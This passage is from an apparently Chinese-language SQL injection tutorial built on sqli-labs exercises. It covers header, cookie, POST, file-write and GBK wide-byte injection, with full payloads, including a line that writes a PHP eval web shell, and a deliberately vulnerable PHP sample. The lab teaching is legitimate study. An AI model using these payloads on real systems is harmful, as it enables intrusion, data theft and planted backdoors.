class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function check_input($value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	if(!empty($value))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		// truncation (see comments)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$value = substr($value,0,20);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		// Stripslashes if magic quotes enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if (get_magic_quotes_gpc())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$value = stripslashes($value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		// Quote if not a number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		if (!ctype_digit($value))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			$value = &amp;quot;&amp;#x27;&amp;quot; . mysql_real_escape_string($value) . &amp;quot;&amp;#x27;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		$value = intval($value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return $value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据代码审计，这关必须建立在用户名和密码正确的基础上，输入正确的 username 和 password 之后抓包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;数据库中接收参数的语句为 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$uagent = $_SERVER[&amp;#x27;HTTP_USER_AGENT&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$IP = $_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png&#34; alt=&#34;image-20220311173048631&#34;&gt;&lt;/p&gt;
&lt;p&gt;0. 数据库中闭合语句为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$insert=&amp;quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&amp;#x27;$uagent&amp;#x27;, &amp;#x27;$IP&amp;#x27;, $uname)&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最终 payload 有两种形式&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: 1&amp;#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1),&amp;#x27;127.0.0.1&amp;#x27;,&amp;#x27;sb&amp;#x27;)#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: 1&amp;#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//但加如)后会导致列数不匹配,后面还需要补充两列&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的&lt;/p&gt;
&lt;h5 id=&#34;cookie注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cookie注入&#34;&gt;#&lt;/a&gt; cookie 注入&lt;/h5&gt;
&lt;p&gt;通过没有过滤 cookie 字段的值产生的 cookie 注入&lt;/p&gt;
&lt;p&gt;sqllab pass-20，21，22&lt;/p&gt;
&lt;p&gt;注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie。只有提交正确的用户名和密码才能到 if 中 setcookie&lt;/p&gt;
&lt;p&gt;后续在第二个包中注入，没有设置 submit 时会进第二个 if 走 select 查询&lt;/p&gt;
&lt;p&gt;验证存在注入：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png&#34; alt=&#34;image-20220311175929845&#34;&gt;&lt;/p&gt;
&lt;p&gt;进行注入：&lt;br&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png&#34; alt=&#34;image-20220311180121906&#34;&gt;&lt;/p&gt;
&lt;p&gt;最终构造的 paylaod 为&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: uname=admin&amp;#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不加 &lt;code&gt;)&lt;/code&gt;  的原因是他的查询语句长这样：&lt;/p&gt;
&lt;p&gt;​      &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;F&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;M&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;sql=&amp;quot;SELECT * FROM users WHERE username=&amp;#x27;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.751892em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;F&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;cookee’ LIMIT 0,1&amp;quot;;&lt;/p&gt;
&lt;p&gt;你只需要闭合 &lt;code&gt;&#39;&lt;/code&gt;  不再需要闭合 &lt;code&gt;)&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;post注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#post注入&#34;&gt;#&lt;/a&gt; post 注入&lt;/h5&gt;
&lt;p&gt;通过 post 提交的参数中注入&lt;/p&gt;
&lt;p&gt;postman,hackbar,burpsuite 可以提交 post 参数&lt;/p&gt;
&lt;p&gt;sqllabs less11  - less14&lt;/p&gt;
&lt;p&gt;sqli - less11&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=-1&amp;#x27; union select 1,2#&amp;amp;passws=1111&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sqlmap 两种形式&lt;/p&gt;
&lt;p&gt;1. 将 http 请求包放入 txt 中&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NxbG1hcC5weQ==&#34;&gt;sqlmap.py&lt;/span&gt; -r 1.txt&lt;/p&gt;
&lt;p&gt;2.sqlmap -u URL --data “”&lt;/p&gt;
&lt;h5 id=&#34;sql读写文件注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql读写文件注入&#34;&gt;#&lt;/a&gt; SQL 读写文件注入&lt;/h5&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select into outfile  导出数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select &amp;lt;?php eval($_POST[&amp;#x27;C&amp;#x27;]);?&amp;gt; into outfile E:/web.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;outfile 导出条件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GPC关闭（能使用单引号)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;有绝对路径（读文件可以不用，写文件必须)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27;)) union select 1,&amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;,3 into outfile &amp;#x27;网站物理路径&amp;#x27; --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;less-7/demo.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27;)) union select 1,2, &amp;quot;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&amp;quot; into outfile &amp;quot;D:/Phpstudy/PHPTutorial/test1.php --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;写马的时候必须使用字符串&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h5&gt;
&lt;p&gt;导致原因： &lt;code&gt;mysql_query(&amp;quot;set names gbk&amp;quot;)&lt;/code&gt;  错误使用了编码方式 &lt;code&gt;gbk&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;一个 &lt;code&gt;gbk&lt;/code&gt;  编码汉字，占用 2 个字节。一个 &lt;code&gt;utf-8&lt;/code&gt;  编码的汉字，占用 3 个字节。&lt;/p&gt;
&lt;p&gt;假设我们有以下代码，并且我们的 &lt;code&gt;magic_quotes_gpc&lt;/code&gt;  是关闭的&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$conn = mysql_connect(&amp;#x27;localhost&amp;#x27;, &amp;#x27;root&amp;#x27;, &amp;#x27;toor!@#$&amp;#x27;) or die(&amp;#x27;bad!&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql_query(&amp;quot;SET NAMES &amp;#x27;gbk&amp;#x27;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql_select_db(&amp;#x27;test&amp;#x27;, $conn) OR emMsg(&amp;quot;连接数据库失败，未找到您填写的数据库&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//执行sql语句&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$id = isset($_GET[&amp;#x27;id&amp;#x27;]) ? addslashes($_GET[&amp;#x27;id&amp;#x27;]) : 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;SELECT * FROM news WHERE tid=&amp;#x27;&amp;#123;$id&amp;#125;&amp;#x27;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;meta charset=&amp;quot;gbk&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;title&amp;gt;新闻&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$row = mysql_fetch_array($result, MYSQL_ASSOC);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;h2&amp;gt;&amp;#123;$row[&amp;#x27;title&amp;#x27;]&amp;#125;&amp;lt;/h2&amp;gt;&amp;lt;p&amp;gt;&amp;#123;$row[&amp;#x27;content&amp;#x27;]&amp;#125;&amp;lt;p&amp;gt;\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql_free_result($result);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果我们想注入，那么必须绕过 &lt;code&gt;addslashes&lt;/code&gt;  的过滤，我们可以有两种思路：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 想办法给 &lt;code&gt;\&lt;/code&gt;  前面再加一个 &lt;code&gt;\&lt;/code&gt; （或单数个即可），变成 &lt;code&gt;\\&#39;&lt;/code&gt; ，这样 &lt;code&gt;\&lt;/code&gt;  被转义了， &lt;code&gt;&#39;&lt;/code&gt;  逃出了限制&lt;/p&gt;
&lt;p&gt;2. 想办法把 &lt;code&gt;\&lt;/code&gt;  弄没有。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们先说把 &lt;code&gt;\&lt;/code&gt;  弄没有的情况&lt;/p&gt;
&lt;p&gt;mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个 ascii 码要大于 128，才到汉字的范围）。如果我们输入 &lt;code&gt;%df&#39;&lt;/code&gt;  看会怎样：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;111ß\&#39;&#39;&#39; at line 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此时出现报错，说明存在注入&lt;/p&gt;
